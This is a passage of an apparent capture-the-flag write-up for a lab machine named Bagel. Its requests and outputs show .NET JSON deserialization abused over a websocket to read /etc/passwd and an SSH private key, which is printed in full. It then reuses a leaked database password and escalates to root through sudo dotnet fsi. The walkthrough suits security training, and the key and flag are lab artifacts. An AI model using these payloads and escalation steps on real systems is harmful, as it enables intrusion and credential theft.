<code>File</code> class:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-09-15-33-25-image.png data-srcset="./assets/2023-04-09-15-33-25-image.png, ./assets/2023-04-09-15-33-25-image.png 1.5x, ./assets/2023-04-09-15-33-25-image.png 2x" data-sizes=auto alt=./assets/2023-04-09-15-33-25-image.png title=./assets/2023-04-09-15-33-25-image.png></p><p>Back in our websocket, let&rsquo;s try passing an object to deserialise by using <code>$type</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; {&#34;RemoveOrder&#34;: {&#34;$type&#34;: &#34;bagel_server.File, bagel&#34;, &#34;directory&#34;: &#34;/tmp/&#34;, &#34;filename&#34;: &#34;foo.txt&#34;, &#34;WriteFile&#34;: &#34;foobagelbaz&#34; }}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&lt; {
+</span></span><span class=line><span class=cl>  &#34;UserId&#34;: 0,
+</span></span><span class=line><span class=cl>  &#34;Session&#34;: &#34;Unauthorized&#34;,
+</span></span><span class=line><span class=cl>  &#34;Time&#34;: &#34;8:30:44&#34;,
+</span></span><span class=line><span class=cl>  &#34;RemoveOrder&#34;: {
+</span></span><span class=line><span class=cl>    &#34;$type&#34;: &#34;bagel_server.File, bagel&#34;,
+</span></span><span class=line><span class=cl>    &#34;ReadFile&#34;: null,
+</span></span><span class=line><span class=cl>    &#34;WriteFile&#34;: &#34;Operation successed&#34;
+</span></span><span class=line><span class=cl>  },
+</span></span><span class=line><span class=cl>  &#34;WriteOrder&#34;: null,
+</span></span><span class=line><span class=cl>  &#34;ReadOrder&#34;: null
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><p>Here, I&rsquo;m naively trying to deserialize a <code>bagel_server.File</code> object, passing the string <code>foobagelbaz</code> into the <code>WriteFile</code> setter, while overwriting the <code>directory</code> and <code>filename</code> &ndash; hoping I can write arbitrary data to arbitrary locations.</p><p>This kinda works &ndash; data is written, but the directory/filename were not set. We can see it was written to the default location <code>/opt/bagel/orders/orders.txt</code>:</p><p><img class=lazyload src=/svg/loading.min.svg data-src=./assets/2023-04-09-15-35-07-image.png data-srcset="./assets/2023-04-09-15-35-07-image.png, ./assets/2023-04-09-15-35-07-image.png 1.5x, ./assets/2023-04-09-15-35-07-image.png 2x" data-sizes=auto alt=./assets/2023-04-09-15-35-07-image.png title=./assets/2023-04-09-15-35-07-image.png></p><p>I&rsquo;m assuming I can&rsquo;t deserialize into private fields (and it&rsquo;s been a while since I&rsquo;ve used .NET!).</p><p>I next looked at the <code>System.Data.ObjectDataProvider</code> gadget after reading about .NET deserialization on <a href=https://book.hacktricks.xyz/pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net target=_blank rel="noopener noreffer">HackTricks</a>. This class lets you instantiate an object of a specified type and call methods on it. So, I tried to create a <code>bagel_server.File</code>, and call <code>WriteFile("/tmp/test.txt", "foobagelbaz")</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{&#34;RemoveOrder&#34;: {&#34;$type&#34;:&#34;System.Windows.Data.ObjectDataProvider,PresentationFramework,Version=4.0.0.0,Culture=neutral,PublicKeyToken=31bf3856ad364e35&#34;,&#34;MethodName&#34;:&#34;WriteContent&#34;,&#34;MethodParameters&#34;:{&#34;$type&#34;:&#34;System.Collections.ArrayList,mscorlib,Version=4.0.0.0,Culture=neutral,PublicKeyToken=b77a5c561934e089&#34;,&#34;$values&#34;:[&#34;/tmp/test.txt&#34;,&#34;foobagelbaz&#34;]},&#34;ObjectInstance&#34;:{&#34;$type&#34;:&#34;bagel_server.File,bagel&#34;}}}
+</span></span><span class=line><span class=cl>&lt; &#34;{\&#34;Message\&#34;:\&#34;unknown\&#34;}&#34;
+</span></span></code></pre></td></tr></table></div></div><p>Trying to retrieve with <a href="http://bagel.htb:8000/?page=../../../../tmp/test.txt" target=_blank rel="noopener noreffer">http://bagel.htb:8000/?page=../../../../tmp/test.txt</a> gave <code>File Not found</code> &ndash; so this didn&rsquo;t work (maybe I&rsquo;m specifying the wrong type version, or it&rsquo;s just not available in dotnetcore given we&rsquo;re looking at Linux server?)</p><p>I confirmed I can call the <code>ReadFile</code> setter with an arbitrary filename (using path traversal) and get back the results, so another cool way of doing LFI.</p><p>Via our web socket, we read <code>/etc/passwd</code> again as a test:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; {&#34;RemoveOrder&#34;: {&#34;$type&#34;: &#34;bagel_server.File, bagel&#34;, &#34;ReadFile&#34;: &#34;../../../etc/passwd&#34;}}
+</span></span><span class=line><span class=cl>&lt; {
+</span></span><span class=line><span class=cl>  &#34;UserId&#34;: 0,
+</span></span><span class=line><span class=cl>  &#34;Session&#34;: &#34;Unauthorized&#34;,
+</span></span><span class=line><span class=cl>  &#34;Time&#34;: &#34;9:19:41&#34;,
+</span></span><span class=line><span class=cl>  &#34;RemoveOrder&#34;: {
+</span></span><span class=line><span class=cl>    &#34;$type&#34;: &#34;bagel_server.File, bagel&#34;,
+</span></span><span class=line><span class=cl>    &#34;ReadFile&#34;: &#34;root❌0:0:root:/root:/bin/bash\nbin❌1:1:bin:/bin:/sbin/nologin\ndaemon❌2:2:daemon:/sbin:/sbin/nologin\nadm❌3:4:adm:/var/adm:/sbin/nologin\nlp❌4:7:lp:/var/spool/lpd:/sbin/nologin\nsync❌5:0:sync:/sbin:/bin/sync\nshutdown❌6:0:shutdown:/sbin:/sbin/shutdown\nhalt❌7:0:halt:/sbin:/sbin/halt\nmail❌8:12:mail:/var/spool/mail:/sbin/nologin\noperator❌11:0:operator:/root:/sbin/nologin\ngames❌12💯games:/usr/games:/sbin/nologin\nftp❌14:50:FTP User:/var/ftp:/sbin/nologin\nnobody❌65534:65534:Kernel Overflow User:/:/sbin/nologin\ndbus❌81:81:System message bus:/:/sbin/nologin\ntss❌59:59:Account used for TPM access:/dev/null:/sbin/nologin\nsystemd-network❌192:192:systemd Network Management:/:/usr/sbin/nologin\nsystemd-oom❌999:999:systemd Userspace OOM Killer:/:/usr/sbin/nologin\nsystemd-resolve❌193:193:systemd Resolver:/:/usr/sbin/nologin\npolkitd❌998:997:User for polkitd:/:/sbin/nologin\nrpc❌32:32:Rpcbind Daemon:/var/lib/rpcbind:/sbin/nologin\nabrt❌173:173::/etc/abrt:/sbin/nologin\nsetroubleshoot❌997:995:SELinux troubleshoot server:/var/lib/setroubleshoot:/sbin/nologin\ncockpit-ws❌996:994:User for cockpit web service:/nonexisting:/sbin/nologin\ncockpit-wsinstance❌995:993:User for cockpit-ws instances:/nonexisting:/sbin/nologin\nrpcuser❌29:29:RPC Service User:/var/lib/nfs:/sbin/nologin\nsshd❌74:74:Privilege-separated SSH:/usr/share/empty.sshd:/sbin/nologin\nchrony❌994:992::/var/lib/chrony:/sbin/nologin\ndnsmasq❌993:991:Dnsmasq DHCP and DNS server:/var/lib/dnsmasq:/sbin/nologin\ntcpdump❌72:72::/:/sbin/nologin\nsystemd-coredump❌989:989:systemd Core Dumper:/:/usr/sbin/nologin\nsystemd-timesync❌988:988:systemd Time Synchronization:/:/usr/sbin/nologin\ndeveloper❌1000:1000::/home/developer:/bin/bash\nphil❌1001:1001::/home/phil:/bin/bash\n_laurel❌987:987::/var/log/laurel:/bin/false&#34;,
+</span></span><span class=line><span class=cl>    &#34;WriteFile&#34;: null
+</span></span><span class=line><span class=cl>  },
+</span></span><span class=line><span class=cl>  &#34;WriteOrder&#34;: null,
+</span></span><span class=line><span class=cl>  &#34;ReadOrder&#34;: null
+</span></span></code></pre></td></tr></table></div></div><p>The comment in python code earlier mentions <code>Use your ssh key to access the machine</code>. We get nothing back for <code>/home/developer/.ssh/id_rsa</code>, but we get a private key for <code>/home/phil/.ssh/id_rsa</code>! So obviously our Flask app did not have read permission on the key, but our dotnet bagel app does:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&gt; {&#34;RemoveOrder&#34;: {&#34;$type&#34;: &#34;bagel_server.File, bagel&#34;, &#34;ReadFile&#34;: &#34;../../../home/developer/.ssh/id_rsa&#34;}}
+</span></span><span class=line><span class=cl>&gt; 
+</span></span><span class=line><span class=cl>&lt; {
+</span></span><span class=line><span class=cl>  &#34;UserId&#34;: 0,
+</span></span><span class=line><span class=cl>  &#34;Session&#34;: &#34;Unauthorized&#34;,
+</span></span><span class=line><span class=cl>  &#34;Time&#34;: &#34;9:22:02&#34;,
+</span></span><span class=line><span class=cl>  &#34;RemoveOrder&#34;: {
+</span></span><span class=line><span class=cl>    &#34;$type&#34;: &#34;bagel_server.File, bagel&#34;,
+</span></span><span class=line><span class=cl>    &#34;ReadFile&#34;: &#34;Order not found!&#34;,
+</span></span><span class=line><span class=cl>    &#34;WriteFile&#34;: null
+</span></span><span class=line><span class=cl>  },
+</span></span><span class=line><span class=cl>  &#34;WriteOrder&#34;: null,
+</span></span><span class=line><span class=cl>  &#34;ReadOrder&#34;: null
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>&lt; null
+</span></span><span class=line><span class=cl>&gt; {&#34;RemoveOrder&#34;: {&#34;$type&#34;: &#34;bagel_server.File, bagel&#34;, &#34;ReadFile&#34;: &#34;../../../home/phil/.ssh/id_rsa&#34;}}
+</span></span><span class=line><span class=cl>&lt; {
+</span></span><span class=line><span class=cl>  &#34;UserId&#34;: 0,
+</span></span><span class=line><span class=cl>  &#34;Session&#34;: &#34;Unauthorized&#34;,
+</span></span><span class=line><span class=cl>  &#34;Time&#34;: &#34;9:22:17&#34;,
+</span></span><span class=line><span class=cl>  &#34;RemoveOrder&#34;: {
+</span></span><span class=line><span class=cl>    &#34;$type&#34;: &#34;bagel_server.File, bagel&#34;,
+</span></span><span class=line><span class=cl>    &#34;ReadFile&#34;: &#34;-----BEGIN OPENSSH PRIVATE KEY-----\n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\nnrEIIvsBGmrx0AAAAKcGhpbEBiYWdlbAE=\n-----END OPENSSH PRIVATE KEY-----&#34;,
+</span></span><span class=line><span class=cl>    &#34;WriteFile&#34;: null
+</span></span><span class=line><span class=cl>  },
+</span></span><span class=line><span class=cl>  &#34;WriteOrder&#34;: null,
+</span></span><span class=line><span class=cl>  &#34;ReadOrder&#34;: null
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>&lt; b&#39;&#39;
+</span></span></code></pre></td></tr></table></div></div><p>Saving the above to <code>phil_id_rsa</code> and SSHing in with this key, we obtain the user flag:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nv>$ssh</span> -i phil_id_rsa phil@bagel.htb
+</span></span><span class=line><span class=cl>Last login: Sun Apr  <span class=m>9</span> 02:52:00 <span class=m>2023</span> from 10.10.14.40
+</span></span><span class=line><span class=cl><span class=o>[</span>phil@bagel ~<span class=o>]</span>$ ls -la
+</span></span><span class=line><span class=cl>total <span class=m>888</span>
+</span></span><span class=line><span class=cl>drwx------. <span class=m>5</span> phil phil   <span class=m>4096</span> Apr  <span class=m>9</span> 02:30 .
+</span></span><span class=line><span class=cl>drwxr-xr-x. <span class=m>4</span> root root     <span class=m>35</span> Aug  <span class=m>9</span>  <span class=m>2022</span> ..
+</span></span><span class=line><span class=cl>lrwxrwxrwx. <span class=m>1</span> root root      <span class=m>9</span> Jan <span class=m>20</span> 17:59 .bash_history -&gt; /dev/null
+</span></span><span class=line><span class=cl>-rw-r--r--. <span class=m>1</span> phil phil     <span class=m>18</span> Jan <span class=m>20</span>  <span class=m>2022</span> .bash_logout
+</span></span><span class=line><span class=cl>-rw-r--r--. <span class=m>1</span> phil phil    <span class=m>141</span> Jan <span class=m>20</span>  <span class=m>2022</span> .bash_profile
+</span></span><span class=line><span class=cl>-rw-r--r--. <span class=m>1</span> phil phil    <span class=m>492</span> Jan <span class=m>20</span>  <span class=m>2022</span> .bashrc
+</span></span><span class=line><span class=cl>drwxrwxr-x. <span class=m>3</span> phil phil   <span class=m>4096</span> Oct <span class=m>22</span> 21:16 .dotnet
+</span></span><span class=line><span class=cl>drwx------. <span class=m>3</span> phil phil     <span class=m>69</span> Apr  <span class=m>9</span> 01:50 .gnupg
+</span></span><span class=line><span class=cl>-rw-------. <span class=m>1</span> phil phil     <span class=m>20</span> Apr  <span class=m>9</span> 02:24 .lesshst
+</span></span><span class=line><span class=cl>-rw-r--r--. <span class=m>1</span> phil phil  <span class=m>46631</span> Feb <span class=m>19</span> 10:57 LinEnum.sh
+</span></span><span class=line><span class=cl>-rw-r--r--. <span class=m>1</span> phil phil <span class=m>828145</span> Feb <span class=m>19</span> 06:30 linpeas.sh
+</span></span><span class=line><span class=cl>drwx------. <span class=m>2</span> phil phil     <span class=m>61</span> Oct <span class=m>23</span> 18:59 .ssh
+</span></span><span class=line><span class=cl>-rw-r-----. <span class=m>1</span> root phil     <span class=m>33</span> Apr  <span class=m>7</span> 07:21 user.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>phil@bagel ~<span class=o>]</span>$ cat user.txt
+</span></span><span class=line><span class=cl>8b326b2de15faecfcfa7968d8a56ab71
+</span></span></code></pre></td></tr></table></div></div><h2 id=privilege-escalation>Privilege Escalation</h2><p>Unfortunately, I don&rsquo;t have phil&rsquo;s password, so can&rsquo;t see available sudoer commands with <code>sudo -l</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>phil@bagel ~<span class=o>]</span>$ sudo -l
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>We trust you have received the usual lecture from the <span class=nb>local</span> System
+</span></span><span class=line><span class=cl>Administrator. It usually boils down to these three things:
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>#1) Respect the privacy of others.</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#2) Think before you type.</span>
+</span></span><span class=line><span class=cl>    <span class=c1>#3) With great power comes great responsibility.</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> phil: 
+</span></span></code></pre></td></tr></table></div></div><p>Running <code>pspy</code> to see which processes/events are running on the system &ndash; this may or may not be something?:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80564  | /usr/bin/sh /usr/libexec/grepconf.sh -c 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80565  | grep -qsi ^COLOR.*none /etc/GREP_COLORS 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80566  | -bash 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80569  | /usr/bin/sh /usr/libexec/grepconf.sh -c 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80570  | grep -qsi ^COLOR.*none /etc/GREP_COLORS 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80571  | /usr/bin/sh /usr/libexec/grepconf.sh -c 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80572  | grep -qsi ^COLOR.*none /etc/GREP_COLORS 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80577  | /usr/bin/locale 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80576  | -bash 
+</span></span><span class=line><span class=cl>2023/04/09 10:14:50 CMD: UID=1001 PID=80578  | /usr/bin/sed -r -e s/^[[:blank:]]*([[:upper:]_]+)=([[:print:][:digit:]\._-]+|&#34;[[:print:][:digit:]\._-]+&#34;)/export \1=\2/;t;d /etc/locale.conf 
+</span></span></code></pre></td></tr></table></div></div><p>Remembering the database connection string we found hardcoded before, with <code>User ID=dev;Password=k8wdAYYKyhnjg3K</code> &ndash; I tried <code>su - developer</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>developer@bagel ~<span class=o>]</span>$ <span class=o>[</span>phil@bagel ~<span class=o>]</span>$ su - developer
+</span></span><span class=line><span class=cl>Password: 
+</span></span><span class=line><span class=cl><span class=o>[</span>developer@bagel ~<span class=o>]</span>$ 
+</span></span><span class=line><span class=cl><span class=o>[</span>developer@bagel ~<span class=o>]</span>$ sudo -l
+</span></span><span class=line><span class=cl>Matching Defaults entries <span class=k>for</span> developer on bagel:
+</span></span><span class=line><span class=cl>    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class=nv>env_keep</span><span class=o>=</span><span class=s2>&#34;COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=nv>env_keep</span><span class=o>+=</span><span class=s2>&#34;MAIL QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&#34;</span>, <span class=nv>env_keep</span><span class=o>+=</span><span class=s2>&#34;LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&#34;</span>, <span class=nv>env_keep</span><span class=o>+=</span><span class=s2>&#34;LC_MONETARY LC_NAME
+</span></span></span><span class=line><span class=cl><span class=s2>    LC_NUMERIC LC_PAPER LC_TELEPHONE&#34;</span>, <span class=nv>env_keep</span><span class=o>+=</span><span class=s2>&#34;LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&#34;</span>,
+</span></span><span class=line><span class=cl>    <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/var/lib/snapd/snap/bin
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>User developer may run the following commands on bagel:
+</span></span><span class=line><span class=cl>    <span class=o>(</span>root<span class=o>)</span> NOPASSWD: /usr/bin/dotnet
+</span></span></code></pre></td></tr></table></div></div><p>We have privelege escalated to the <code>developer</code> user and <code>sudo -l</code> shows we can run <code>/usr/bin/dotnet</code> as root. Looking at <a href=https://gtfobins.github.io/gtfobins/dotnet/ target=_blank rel="noopener noreffer">GTFOBins</a> for dotnet, we can run <code>dotnet fsi</code> to get an F# interactive shell, and then break out to a shell with <code>System.Diagnostics.Process.Start("/bin/sh").WaitForExit();;</code>. Trying this out:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>developer@bagel ~<span class=o>]</span>$ sudo /usr/bin/dotnet fsi
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Microsoft <span class=o>(</span>R<span class=o>)</span> F# Interactive version 12.0.0.0 <span class=k>for</span> F# 6.0
+</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> Microsoft Corporation. All Rights Reserved.
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>For <span class=nb>help</span> <span class=nb>type</span> <span class=c1>#help;;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>&gt; System.Diagnostics.Process.Start<span class=o>(</span><span class=s2>&#34;/bin/sh&#34;</span><span class=o>)</span>.WaitForExit<span class=o>()</span><span class=p>;;</span>
+</span></span><span class=line><span class=cl>sh-5.2# whoami
+</span></span><span class=line><span class=cl>root
+</span></span><span class=line><span class=cl>sh-5.2# ls -la /root
+</span></span><span class=line><span class=cl>total <span class=m>60</span>
+</span></span><span class=line><span class=cl>dr-xr-x---.  <span class=m>7</span> root root  <span class=m>4096</span> Feb <span class=m>14</span> 11:53 .
+</span></span><span class=line><span class=cl>drwxr-xr-x. <span class=m>18</span> root root  <span class=m>4096</span> Jan <span class=m>20</span> 18:00 ..
+</span></span><span class=line><span class=cl>-rw-------.  <span class=m>1</span> root root  <span class=m>1105</span> Oct <span class=m>22</span> 20:47 anaconda-ks.cfg
